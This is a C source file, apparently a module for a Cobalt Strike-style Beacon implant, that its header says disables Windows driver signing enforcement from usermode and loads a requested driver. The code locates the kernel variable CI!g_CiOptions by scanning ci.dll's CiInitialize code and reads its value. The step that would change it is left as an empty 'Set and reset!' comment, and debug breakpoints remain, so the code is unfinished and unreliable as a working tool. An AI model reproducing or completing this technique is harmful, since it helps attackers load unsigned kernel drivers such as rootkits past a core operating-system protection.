/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Attempts to use the elevated thread to
 * disable driver signing enforcement.
 *
**/

D_SEC( B ) VOID WINAPI DsePatch( _In_ PBEACON_API BeaconApi, _In_ PAPI Api ) 
{
	ULONG				Opt = 0;
	ULONG				Fir = 0;
	ULONG				Rel = 0;
	ULONG				Off = 0;
	PBYTE				Ptr = NULL;
	PVOID				Map = NULL;
	PCHAR				Str = NULL;
	ULONG				Len = 0;
	PSYSTEM_MODULE_INFORMATION 	Inf = NULL;

	hde64s				Hde;
	RTL_OSVERSIONINFOW		Ver;

	RtlSecureZeroMemory( &Hde, sizeof( Hde ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );
	Ver.dwOSVersionInfoSize = sizeof( Ver );

	Api->RtlGetVersion( &Ver );

	/* Get size! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info length." ) ) );
		goto Leave;
	};

	/* Get ptrs! */
	if ( !( Inf = Api->LocalAlloc( LPTR, Len ) ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not allocate module info." ) ) );
		goto Leave;
	};

	/* Get info! */
	if ( !( Api->NtQuerySystemInformation( SystemModuleInformation, Inf, Len, NULL ) >= 0 ) ) {
		BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get module info." ) ) );
		goto Leave;
	};

	/* Enumerate modules! */
	for ( ULONG Idx = 0 ; Idx < Inf->Count ; ++Idx ) {
		Str = C_PTR( U_PTR( Inf->Module[ Idx ].FullPathName ) + Inf->Module[ Idx ].OffsetToFileName );

		/* Is CI.DLL? */
		if ( HashString( Str, 0 ) == H_STR_CI ) {

			Map = Api->LoadLibraryEx( C_PTR( G_SYM( "C:\\Windows\\System32\\ci.dll" ) ), NULL, DONT_RESOLVE_DLL_REFERENCES );

			if ( Map != NULL )
			{
				Ptr = PeGetFuncEat( Map, H_STR_CIINITIALIZE );
				Rel = 0;
				Off = 0;

				if ( Ptr != NULL )
				{
					if ( Ver.dwBuildNumber < 16299 ) {
						/* Before RS3! */
						do 
						{
							hde64_disasm( &Ptr[ Off ], &Hde );

							if ( Hde.flags & F_ERROR ) {
								break;
							};

							if ( Hde.len == 5 ) {
								if ( Ptr[ Off ] == 0xe9 ) {
									Rel = *( LONG * )( U_PTR( Ptr ) + Off + 1 );
									__debugbreak();
									break;
								};
							};
							Off += Hde.len;
						} while ( Off < 256 );
					} else {
						do
						{
							hde64_disasm( &Ptr[ Off ], &Hde );

							if ( Hde.flags & F_ERROR ) {
								break;
							};

							if ( Hde.len == 5 ) {
								if ( Ptr[ Off ] == 0xe8 ) { 
									if ( Fir != 1 ) {
										Fir = 1; continue;
									};
									Rel = *( LONG * )( U_PTR( Ptr ) + Off + 1 );
									__debugbreak();
									break;
								};
							};
							Off += Hde.len;
						} while ( Off < 256 );
					};

					if ( ! Rel ) {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find CipInitialize." ) ) );
						goto Leave;
					};

					Ptr = C_PTR( U_PTR( Ptr ) + U_PTR( Off ) + U_PTR( Hde.len ) + U_PTR( Rel ) );
					Rel = 0;
					Off = 0;

					do 
					{
						hde64_disasm( &Ptr[ Off ], &Hde );

						if ( Hde.flags & F_ERROR ) {
							break;
						};

						if ( Hde.len == 6 ) {
							if ( Ptr[ Off ] == 0x89 && Ptr[ Off + 1 ] == 0x0d ) {
								Rel = *( ULONG * )( Ptr + Off + 2 );
								break;
							};
						};
						Off += Hde.len;
					} while ( Off < 256 );

					if ( ! Rel ) {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find g_CiOptions" ) ) );
						goto Leave;
					};

					Ptr = C_PTR( U_PTR( Ptr ) + U_PTR( Off ) + U_PTR( Hde.len ) + U_PTR( Rel ) );
					Ptr = C_PTR( U_PTR( Ptr ) - U_PTR( Map ) + U_PTR( Inf->Module[ Idx ].ImageBase ) );

					if ( ! Api->NtReadVirtualMemory( ( ( HANDLE ) - 1 ), Ptr, &Opt, sizeof( Opt ), NULL ) ) {
						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions @ 0x%p\n" ) ), Ptr );
						BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, C_PTR( G_SYM( "CI!g_CiOptions = 0x%x\n" ) ), Opt );

						/* Set and reset! */
					} else {
						BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not read g_CiOptions" ) ) );
						goto Leave;
					};
				} else {
					BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not find CiInitialize" ) ) );
					goto Leave;
				};
			} else {
				BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not load ci.dll" ) ) );
				goto Leave;
			};
		};
	};
Leave:
	if ( Inf != NULL ) {
		Api->LocalFree( Inf );
	};
	if ( Map != NULL ) {
		Api->FreeLibrary( Map );
	};
};
